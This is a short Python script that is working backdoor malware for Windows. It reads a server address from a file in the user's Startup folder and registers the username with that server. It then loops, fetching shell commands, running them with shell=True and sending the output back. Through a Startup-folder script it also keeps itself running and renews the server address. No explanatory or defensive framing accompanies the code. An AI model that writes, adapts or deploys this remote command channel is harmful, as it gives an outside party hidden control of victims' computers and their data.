import requests
import subprocess
import time
import getpass


username = getpass.getuser()
data = {
    "user": username
}

RetryIP = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\GetIP.cmd"

with open(f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/CurrentIP.txt", "r") as file:
    server = file.read()

print(username)
response = requests.post(f"{server}/users", json=data)
print(response.text)

while True:
    try:
        response = requests.get(f"{server}/getcmd?user={username}")
        cmd = response.json().get("cmd")

        if cmd:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            requests.post(f"{server}/result", json={
                "user": username,
                "output": output
            })
    except Exception as e:
        print("Fehler:", e)
        subprocess.run([RetryIP], shell=True)
        with open(f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/CurrentIP.txt", "r") as file:
            server = file.read()
